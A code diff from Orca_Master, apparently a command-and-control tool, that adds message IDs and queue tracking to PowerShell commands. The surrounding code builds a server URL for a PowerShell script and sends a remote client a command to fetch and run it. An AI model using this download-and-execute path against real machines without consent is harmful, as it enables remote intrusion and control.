@@ -9,6 +9,7 @@ import (
 	"Orca_Master/define/config"
 	"Orca_Master/define/retcode"
 	"Orca_Master/tools/crypto"
+	"Orca_Master/tools/util"
 	"encoding/json"
 	"fmt"
 	"github.com/desertbit/grumble"
@@ -105,7 +106,7 @@ var powershellListScriptsCmd = &grumble.Command{
 		// 发送消息
 		msg := "powershellList"
 		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
-		common.SendSuccessMsg("Server", common.ClientId, msg, data)
+		common.SendSuccessMsg("Server", common.ClientId, msg, data, "")
 		// 接收消息，显示已加载的程序集
 		select {
 		case msg := <-common.DefaultMsgChan:
@@ -173,7 +174,7 @@ var powershellInvokeCmd = &grumble.Command{
 		// 发送消息
 		msg := "powershellList"
 		data, _ := crypto.Encrypt(marshal, []byte(config.AesKey))
-		common.SendSuccessMsg("Server", common.ClientId, msg, data)
+		common.SendSuccessMsg("Server", common.ClientId, msg, data, "")
 		// 接收消息，显示已加载的程序集
 		select {
 		case msg := <-common.DefaultMsgChan:
@@ -193,6 +194,8 @@ var powershellInvokeCmd = &grumble.Command{
 		return []string{}
 	},
 	Run: func(c *grumble.Context) error {
+		messageId := util.GenUUID()
+		common.MessageQueue = append(common.MessageQueue, messageId)
 		if SelectId == -1 {
 			colorcode.PrintMessage(colorcode.SIGN_ERROR, "please select the id first")
 			return nil
@@ -216,7 +219,7 @@ var powershellInvokeCmd = &grumble.Command{
 		}
 		url := fmt.Sprintf("http://$host$/files/powershell/%s", file)
 		cmdStr := powershellopt.PowershellCmdParse(powershellYaml, initCmd, url)
-		retData := powershellopt.SendExecShellMsg(SelectClientId, cmdStr)
+		retData := powershellopt.SendExecShellMsg(SelectClientId, cmdStr, messageId)
 		if retData.Code != retcode.SUCCESS {
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "powershell request failed")
 			return nil
@@ -225,6 +228,7 @@ var powershellInvokeCmd = &grumble.Command{
 		select {
 		case msg := <-common.ExecShellMsgChan:
 			shellopt.PrintShellOutput(msg)
+			common.MessageQueue = common.MessageQueue[1:]
 		case <-time.After(time.Duration(10+timeout) * time.Second):
 			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
 			return nil
